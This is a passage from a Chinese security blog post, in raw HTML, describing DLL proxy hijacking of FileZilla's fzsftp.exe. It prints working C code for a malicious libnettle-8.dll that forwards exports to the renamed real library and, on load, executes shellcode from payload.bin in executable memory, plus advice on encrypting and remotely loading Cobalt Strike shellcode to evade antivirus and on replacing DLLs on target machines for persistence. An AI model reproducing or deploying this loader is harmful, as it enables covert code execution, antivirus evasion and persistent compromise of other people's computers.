class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_set_nonce&#x3D;tmp2BF5.nettle_umac128_set_nonce,@450&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac128_update&#x3D;tmp2BF5.nettle_umac128_update,@451&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_digest&#x3D;tmp2BF5.nettle_umac32_digest,@452&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_set_key&#x3D;tmp2BF5.nettle_umac32_set_key,@453&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_set_nonce&#x3D;tmp2BF5.nettle_umac32_set_nonce,@454&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac32_update&#x3D;tmp2BF5.nettle_umac32_update,@455&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_digest&#x3D;tmp2BF5.nettle_umac64_digest,@456&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_set_key&#x3D;tmp2BF5.nettle_umac64_set_key,@457&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_set_nonce&#x3D;tmp2BF5.nettle_umac64_set_nonce,@458&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac64_update&#x3D;tmp2BF5.nettle_umac64_update,@459&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_digest&#x3D;tmp2BF5.nettle_umac96_digest,@460&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_set_key&#x3D;tmp2BF5.nettle_umac96_set_key,@461&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_set_nonce&#x3D;tmp2BF5.nettle_umac96_set_nonce,@462&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_umac96_update&#x3D;tmp2BF5.nettle_umac96_update,@463&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_version_major&#x3D;tmp2BF5.nettle_version_major,@464&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_version_minor&#x3D;tmp2BF5.nettle_version_minor,@465&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xrealloc&#x3D;tmp2BF5.nettle_xrealloc,@466&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_decrypt_message&#x3D;tmp2BF5.nettle_xts_aes128_decrypt_message,@467&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_encrypt_message&#x3D;tmp2BF5.nettle_xts_aes128_encrypt_message,@468&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_set_decrypt_key&#x3D;tmp2BF5.nettle_xts_aes128_set_decrypt_key,@469&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes128_set_encrypt_key&#x3D;tmp2BF5.nettle_xts_aes128_set_encrypt_key,@470&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_decrypt_message&#x3D;tmp2BF5.nettle_xts_aes256_decrypt_message,@471&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_encrypt_message&#x3D;tmp2BF5.nettle_xts_aes256_encrypt_message,@472&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_set_decrypt_key&#x3D;tmp2BF5.nettle_xts_aes256_set_decrypt_key,@473&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_aes256_set_encrypt_key&#x3D;tmp2BF5.nettle_xts_aes256_set_encrypt_key,@474&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_decrypt_message&#x3D;tmp2BF5.nettle_xts_decrypt_message,@475&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_xts_encrypt_message&#x3D;tmp2BF5.nettle_xts_encrypt_message,@476&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_fast_reseed&#x3D;tmp2BF5.nettle_yarrow256_fast_reseed,@477&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_init&#x3D;tmp2BF5.nettle_yarrow256_init,@478&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_is_seeded&#x3D;tmp2BF5.nettle_yarrow256_is_seeded,@479&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_needed_sources&#x3D;tmp2BF5.nettle_yarrow256_needed_sources,@480&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_random&#x3D;tmp2BF5.nettle_yarrow256_random,@481&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_seed&#x3D;tmp2BF5.nettle_yarrow256_seed,@482&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_slow_reseed&#x3D;tmp2BF5.nettle_yarrow256_slow_reseed,@483&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow256_update&#x3D;tmp2BF5.nettle_yarrow256_update,@484&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow_key_event_estimate&#x3D;tmp2BF5.nettle_yarrow_key_event_estimate,@485&quot;)</span><br><span class="line">#pragma comment(linker, &quot;&#x2F;export:nettle_yarrow_key_event_init&#x3D;tmp2BF5.nettle_yarrow_key_event_init,@486&quot;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DWORD WINAPI DoMagic(LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14002954&#x2F;c-programming-how-to-read-the-whole-file-contents-into-a-buffer</span><br><span class="line">    FILE* fp;</span><br><span class="line">    size_t size;</span><br><span class="line">    unsigned char* buffer;</span><br><span class="line"></span><br><span class="line">    fp &#x3D; fopen(&quot;payload.bin&quot;, &quot;rb&quot;);</span><br><span class="line">    fseek(fp, 0, SEEK_END);</span><br><span class="line">    size &#x3D; ftell(fp);</span><br><span class="line">    fseek(fp, 0, SEEK_SET);</span><br><span class="line">    buffer &#x3D; (unsigned char*)malloc(size);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;ired.team&#x2F;offensive-security&#x2F;code-injection-process-injection&#x2F;loading-and-executing-shellcode-from-portable-executable-resources</span><br><span class="line">    fread(buffer, size, 1, fp);</span><br><span class="line">    </span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    </span><br><span class="line">    memcpy(exec, buffer, size);</span><br><span class="line">    </span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE threadHandle;</span><br><span class="line"></span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        &#x2F;&#x2F; https:&#x2F;&#x2F;gist.github.com&#x2F;securitytube&#x2F;c956348435cc90b8e1f7</span><br><span class="line">                &#x2F;&#x2F; Create a thread and close the handle as we do not want to use it to wait for it </span><br><span class="line">        threadHandle &#x3D; CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);</span><br><span class="line">        CloseHandle(threadHandle);</span><br><span class="line">    </span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Domagic函数从payload.bin中读取shellcode，之后使用virtualmalloc和malloc函数分配相应大小的内存空间，再将指针指向对应的空间执行shellcode</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">DWORD WINAPI DoMagic(LPVOID lpParameter)</span><br><span class="line">&#123;</span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;stackoverflow.com&#x2F;questions&#x2F;14002954&#x2F;c-programming-how-to-read-the-whole-file-contents-into-a-buffer</span><br><span class="line">    FILE* fp;</span><br><span class="line">    size_t size;</span><br><span class="line">    unsigned char* buffer;</span><br><span class="line"></span><br><span class="line">    fp &#x3D; fopen(&quot;payload.bin&quot;, &quot;rb&quot;);</span><br><span class="line">    fseek(fp, 0, SEEK_END);</span><br><span class="line">    size &#x3D; ftell(fp);</span><br><span class="line">    fseek(fp, 0, SEEK_SET);</span><br><span class="line">    buffer &#x3D; (unsigned char*)malloc(size);</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;https:&#x2F;&#x2F;ired.team&#x2F;offensive-security&#x2F;code-injection-process-injection&#x2F;loading-and-executing-shellcode-from-portable-executable-resources</span><br><span class="line">    fread(buffer, size, 1, fp);</span><br><span class="line">    </span><br><span class="line">    void* exec &#x3D; VirtualAlloc(0, size, MEM_COMMIT, PAGE_EXECUTE_READWRITE);</span><br><span class="line">    </span><br><span class="line">    memcpy(exec, buffer, size);</span><br><span class="line">    </span><br><span class="line">    ((void(*) ())exec)();</span><br><span class="line">    </span><br><span class="line">    return 0;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>Dllmain函数为dll函数的入口</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">BOOL APIENTRY DllMain(HMODULE hModule,</span><br><span class="line">    DWORD ul_reason_for_call,</span><br><span class="line">    LPVOID lpReserved</span><br><span class="line">)</span><br><span class="line">&#123;</span><br><span class="line">    HANDLE threadHandle;</span><br><span class="line"></span><br><span class="line">    switch (ul_reason_for_call)</span><br><span class="line">    &#123;</span><br><span class="line">    case DLL_PROCESS_ATTACH:</span><br><span class="line">        &#x2F;&#x2F; https:&#x2F;&#x2F;gist.github.com&#x2F;securitytube&#x2F;c956348435cc90b8e1f7</span><br><span class="line">                &#x2F;&#x2F; Create a thread and close the handle as we do not want to use it to wait for it </span><br><span class="line">        threadHandle &#x3D; CreateThread(NULL, 0, DoMagic, NULL, 0, NULL);</span><br><span class="line">        CloseHandle(threadHandle);</span><br><span class="line">    </span><br><span class="line">    case DLL_THREAD_ATTACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_THREAD_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    case DLL_PROCESS_DETACH:</span><br><span class="line">        break;</span><br><span class="line">    &#125;</span><br><span class="line">    return TRUE;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p>原文章的原理如下图    </p>
<p>A：fzsftp.exe </p>
<p>B:tmp2BF5.dll(正常的libnettle-8.dll文件) </p>
<p>C:恶意libnettle-8.dll </p>
<p>E:payload.bin 存储shellcode</p>
<p><a target="_blank" rel="noopener" href="https://imgbed.cn/"><img src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/7bf01099-c86a-478d-977c-32479a0758df.png" alt="imgbed.cn图床"></a></p>
<p>实际操作中用cs直接生成的shellcode已经被杀软识别，因此免杀效果很差，将shellcode分离后远程加载并进行加密后才可以实现免杀。在实战中可以根据目标机器上安装的软件生成dll文件并替换，实现权限维持</p>
<p>参考</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://cloud.tencent.com/developer/article/1739263">https://cloud.tencent.com/developer/article/1739263</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/Flangvik/SharpDllProxy">https://github.com/Flangvik/SharpDllProxy</a></p>
<p><a target="_blank" rel="noopener" href="https://gist.github.com/securitytube/c956348435cc90b8e1f7">https://gist.github.com/securitytube/c956348435cc90b8e1f7</a></p>
</blockquote>
</div></article></div><nav class="pagination" role="navigation" aria-label="pagination"><div class="pagination-previous"><a href="/">上一页</a></div><div class="pagination-next"><a href="/page/3/">下一页</a></div><ul class="pagination-list is-hidden-mobile"><li><a class="pagination-link" href="/">1</a></li><li><a class="pagination-link is-current" href="/page/2/">2</a></li><li><a class="pagination-link" href="/page/3/">3</a></li></ul></nav></div><div class="column column-left is-4-tablet is-4-desktop is-4-widescreen  order-1"><div class="card widget" data-type="profile"><div class="card-content"><nav class="level"><div class="level-item has-text-centered flex-shrink-1"><div><figure class="image is-128x128 mx-auto mb-2"><img class="avatar" src="https://vkceyugu.cdn.bspapp.com/VKCEYUGU-imgbed/5e0ca597-42d5-4a53-a683-2e0dd44f5952.jpg" alt="Sp4z"></figure><p class="title is-size-4 is-block" style="line-height:inherit;">Sp4z</p></div></div></nav><nav class="level is-mobile"><div class="level-item has-text-centered is-marginless"><div><p class="heading">文章</p><a href="/archives"><p class="title">22</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">分类</p><a href="/categories"><p class="title">0</p></a></div></div><div class="level-item has-text-centered is-marginless"><div><p class="heading">标签</p><a href="/tags"><p class="title">0</p></a></div></div></nav><div class="level"><a class="level-item button is-primary is-rounded" href="https://github.com/ppoffice" target="_blank" rel="noopener">关注我</a></div><div class="level is-mobile"><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Github" href="https://github.com/ppoffice"><i class="fab fa-github"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Facebook" href="https://facebook.com"><i class="fab fa-facebook"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Twitter" href="https://twitter.com"><i class="fab fa-twitter"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="Dribbble" href="https://dribbble.com"><i class="fab fa-dribbble"></i></a><a class="level-item button is-transparent is-marginless" target="_blank" rel="noopener" title="RSS" href="/"><i class="fas fa-rss"></i></a></div></div></div><!--!--><div class="card widget" data-type="links"><div class="card-content"><div class="menu"><h3 class="menu-label">链接</h3><ul class="menu-list"><li><a class="level is-mobile" href="https://hexo.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Hexo</span></span><span class="level-right"><span class="level-item tag">hexo.io</span></span></a></li><li><a class="level is-mobile" href="https://bulma.io" target="_blank" rel="noopener"><span class="level-left"><span class="level-item">Bulma</span></span><span class="level-right"><span class="level-item tag">bulma.io</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="recent-posts"><div class="card-content"><h3 class="menu-label">最新文章</h3><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-25T14:03:26.000Z">2021-03-25</time></p><p class="title"><a href="/2021/03/25/phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%AD%A6%E4%B9%A0/">phar反序列化学习</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-23T07:34:27.000Z">2021-03-23</time></p><p class="title"><a href="/2021/03/23/nepctf%E9%83%A8%E5%88%86wp/">nepctf部分wp</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-13T02:11:38.000Z">2021-03-13</time></p><p class="title"><a href="/2021/03/13/2019%E5%BC%BA%E7%BD%91%E6%9D%AFweb%E9%83%A8%E5%88%86%E5%A4%8D%E7%8E%B0/">2019强网杯web部分复现</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-11T02:43:50.000Z">2021-03-11</time></p><p class="title"><a href="/2021/03/11/msf%E5%92%8Ccs%E8%81%94%E5%8A%A8/">msf和cs联动</a></p></div></article><article class="media"><div class="media-content"><p class="date"><time dateTime="2021-03-06T03:15:29.000Z">2021-03-06</time></p><p class="title"><a href="/2021/03/06/python%E7%BC%96%E5%86%99Redis%E6%BC%8F%E6%B4%9E%E6%A3%80%E6%B5%8B%E5%92%8C%E5%88%A9%E7%94%A8%E8%84%9A%E6%9C%AC/">python编写Redis漏洞检测和利用脚本</a></p></div></article></div></div><div class="card widget" data-type="archives"><div class="card-content"><div class="menu"><h3 class="menu-label">归档</h3><ul class="menu-list"><li><a class="level is-mobile" href="/archives/2021/03/"><span class="level-start"><span class="level-item">三月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/02/"><span class="level-start"><span class="level-item">二月 2021</span></span><span class="level-end"><span class="level-item tag">8</span></span></a></li><li><a class="level is-mobile" href="/archives/2021/01/"><span class="level-start"><span class="level-item">一月 2021</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/12/"><span class="level-start"><span class="level-item">十二月 2020</span></span><span class="level-end"><span class="level-item tag">4</span></span></a></li><li><a class="level is-mobile" href="/archives/2020/11/"><span class="level-start"><span class="level-item">十一月 2020</span></span><span class="level-end"><span class="level-item tag">1</span></span></a></li></ul></div></div></div><!--!--><div class="card widget" data-type="subscribe-email"><div class="card-content"><div class="menu"><h3 class="menu-label">订阅更新</h3><form action="https://feedburner.google.com/fb/a/mailverify" method="post" target="popupwindow" onsubmit="window.open(&#039;https://feedburner.google.com/fb/a/mailverify?uri=&#039;,&#039;popupwindow&#039;,&#039;scrollbars=yes,width=550,height=520&#039;);return true"><input type="hidden" value="" name="uri"><input type="hidden" name="loc" value="en_US"><div class="field has-addons"><div class="control has-icons-left is-expanded"><input class="input" name="email" type="email" placeholder="Email"><span class="icon is-small is-left"><i class="fas fa-envelope"></i></span></div><div class="control"><input class="button" type="submit" value="订阅"></div></div></form></div></div></div><div class="card widget"><div class="card-content"><div class="notification is-danger">You need to set <code>client_id</code> and <code>slot_id</code> to show this AD unit. Please set it in <code>_config.yml</code>.</div></div></div></div><!--!--></div></div></section><footer class="footer"><div class="container"><div class="level"><div class="level-start"><a class="footer-logo is-block mb-2" href="/"><img src="/img/logo.svg" alt="Hexo" height="28"></a><p class="is-size-7"><span>&copy; 2021 John Doe</span>  Powered by <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a> &amp; <a href="https://github.com/ppoffice/hexo-theme-icarus" target="_blank" rel="noopener">Icarus</a></p></div><div class="level-end"><div class="field has-addons"><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Attribution 4.0 International" href="https://creativecommons.org/licenses/by/4.0/"><i class="fab fa-creative-commons-by"></i></a></p><p class="control"><a class="button is-transparent is-large" target="_blank" rel="noopener" title="Download on GitHub" href="https://github.com/ppoffice/hexo-theme-icarus"><i class="fab fa-github"></i></a></p></div></div></div></div></footer><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/moment@2.22.2/min/moment-with-locales.min.js"></script><script src="https://cdn.jsdelivr.net/npm/clipboard@2.0.4/dist/clipboard.min.js" async></script><script>moment.locale("zh-CN");</script><script>var IcarusThemeSettings = {
            article: {
                highlight: {
                    clipboard: true,
                    fold: 'unfolded'
                }
            }
        };</script><script src="/js/column.js"></script><script src="/js/animation.js"></script><a id="back-to-top" title="回到顶端" href="javascript:;"><i class="fas fa-chevron-up"></i></a><script src="/js/back_to_top.js" defer></script><!--!--><!--!--><!--!--><script src="https://cdn.jsdelivr.net/npm/cookieconsent@3.1.1/build/cookieconsent.min.js" defer></script><script>window.addEventListener("load", () => {
      window.cookieconsent.initialise({
        type: "info",
        theme: "edgeless",
        static: false,
        position: "bottom-left",
        content: {
          message: "此网站使用Cookie来改善您的体验。",
          dismiss: "知道了！",
          allow: "允许使用Cookie",
          deny: "拒绝",
          link: "了解更多",
          policy: "Cookie政策",
          href: "https://www.cookiesandyou.com/",
        },
        palette: {
          popup: {
            background: "#edeff5",
            text: "#838391"
          },
          button: {
            background: "#4b81e8"
          },
        },
      });
    });</script><script src="https://cdn.jsdelivr.net/npm/lightgallery@1.6.8/dist/js/lightgallery.min.js" defer></script><script src="https://cdn.jsdelivr.net/npm/justifiedGallery@3.7.0/dist/js/jquery.justifiedGallery.min.js" defer></script><script>window.addEventListener("load", () => {
            if (typeof $.fn.lightGallery === 'function') {
                $('.article').lightGallery({ selector: '.gallery-item' });
            }
            if (typeof $.fn.justifiedGallery === 'function') {
                if ($('.justified-gallery > p > .gallery-item').length) {
                    $('.justified-gallery > p > .gallery-item').unwrap();
                }
                $('.justified-gallery').justifiedGallery();
            }
        });</script><!--!--><!--!--><!--!--><!--!--><!--!--><script src="/js/main.js" defer></script><div class="searchbox"><div class="searchbox-container"><div class="searchbox-header"><div class="searchbox-input-container"><input class="searchbox-input" type="text" placeholder="想要查找什么..."></div><a class="searchbox-close" href="javascript:;">×</a></div><div class="searchbox-body"></div></div></div><script src="/js/insight.js" defer></script><script>document.addEventListener('DOMContentLoaded', function () {
            loadInsight({"contentUrl":"/content.json"}, {"hint":"想要查找什么...","untitled":"(无标题)","posts":"文章","pages":"页面","categories":"分类","tags":"标签"});
        });</script></body></html>